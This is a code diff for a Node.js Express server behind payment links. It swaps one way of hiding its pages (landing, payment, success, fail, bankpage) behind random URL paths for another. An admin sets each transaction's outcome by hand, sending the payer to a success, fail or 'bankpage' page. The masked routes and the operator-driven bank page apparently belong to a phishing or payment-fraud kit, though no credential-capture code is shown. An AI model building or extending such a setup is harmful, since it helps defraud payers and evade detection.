@@ -12,52 +12,55 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
-// Map of route hashes to actual HTML files
-const routeHashMap = new Map();
-
-// Generate random hashes for each page
-const pageHashes = {
-  landing: crypto.randomBytes(10).toString('hex'),
-  payment: crypto.randomBytes(10).toString('hex'),
-  success: crypto.randomBytes(10).toString('hex'),
-  fail: crypto.randomBytes(10).toString('hex'),
-  bankpage: crypto.randomBytes(10).toString('hex'),
-  admin: 'admin' // Keep admin accessible via /admin for ease of use
+// Create URL masks for each HTML page
+// These constants will be used for URL generation
+const URL_MASKS = {
+  'landing.html': crypto.randomBytes(12).toString('hex'),
+  'payment.html': crypto.randomBytes(12).toString('hex'),
+  'success.html': crypto.randomBytes(12).toString('hex'),
+  'fail.html': crypto.randomBytes(12).toString('hex'),
+  'bankpage.html': crypto.randomBytes(12).toString('hex'),
+  'admin.html': 'admin' // Keep admin accessible normally
 };
 
-// Create obfuscated routes
-Object.entries(pageHashes).forEach(([page, hash]) => {
-  // Store hash -> page mapping for lookups
-  routeHashMap.set(hash, `${page}.html`);
-  
-  // Create route with the hash
-  app.get(`/${hash}`, (req, res) => {
-    res.sendFile(path.join(process.cwd(), `${page}.html`));
+// Reverse mapping for lookups
+const MASK_TO_PAGE = {};
+for (const [page, mask] of Object.entries(URL_MASKS)) {
+  MASK_TO_PAGE[mask] = page;
+}
+
+// Log the mappings for reference
+console.log('URL Masks:');
+for (const [page, mask] of Object.entries(URL_MASKS)) {
+  console.log(`${page} => /${mask}`);
+}
+
+// Set up masked routes
+Object.entries(URL_MASKS).forEach(([page, mask]) => {
+  app.get(`/${mask}`, (req, res) => {
+    // Keep the query parameters
+    const queryString = Object.entries(req.query)
+      .map(([key, value]) => `${key}=${value}`)
+      .join('&');
+    
+    // Redirect to the actual page but keep the masked URL in address bar
+    res.sendFile(path.join(process.cwd(), page));
   });
 });
 
-// Redirect root to landing page hash
-app.get('/', (req, res) => {
-  res.redirect(`/${pageHashes.landing}`);
-});
-
-// Serve static files after our routes
+// Serve static files as usual
 app.use(express.static("."));
 
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
-  console.log('Page hashes:');
-  Object.entries(pageHashes).forEach(([page, hash]) => {
-    console.log(`${page}: /${hash}`);
-  });
 });
 
 const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Payment Links Endpoints
+// Payment Links Endpoints - Update generatePaymentLink to use masks
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -73,8 +76,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     
-    // Use the obfuscated hash instead of 'landing.html'
-    const paymentLink = `${protocol}://${req.get('host')}/${pageHashes.landing}?pid=${invoiceId}`;
+    // Use the mask instead of 'landing.html'
+    const landingMask = URL_MASKS['landing.html'];
+    const paymentLink = `${protocol}://${req.get('host')}/${landingMask}?pid=${invoiceId}`;
 
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
@@ -176,11 +180,11 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   }
 
   if (txn.redirectStatus) {
-    // Use the obfuscated hashes instead of page names
+    // Update URLs to use the masks
     const redirectUrls = {
-      success: `/${pageHashes.success}?invoiceId=${invoiceId}`,
-      fail: `/${pageHashes.fail}?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
-      bankpage: `/${pageHashes.bankpage}?invoiceId=${invoiceId}`
+      success: `/${URL_MASKS['success.html']}?invoiceId=${invoiceId}`,
+      fail: `/${URL_MASKS['fail.html']}?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
+      bankpage: `/${URL_MASKS['bankpage.html']}?invoiceId=${invoiceId}`
     };
     return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
@@ -210,17 +214,17 @@ app.post('/api/updateRedirectStatus', (req, res) => {
     txn.failureReason = failureReason;
   }
 
-  // Use the obfuscated hashes instead of page names
+  // Update URLs to use the masks
   const redirectUrls = {
-    success: `/${pageHashes.success}?invoiceId=${invoiceId}`,
-    fail: `/${pageHashes.fail}?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+    success: `/${URL_MASKS['success.html']}?invoiceId=${invoiceId}`,
+    fail: `/${URL_MASKS['fail.html']}?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
   };
 
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: redirectUrls[redirectStatus] || `/${pageHashes.bankpage}?invoiceId=${invoiceId}`
+    redirectUrl: redirectUrls[redirectStatus] || `/${URL_MASKS['bankpage.html']}?invoiceId=${invoiceId}`
   });
 });
 
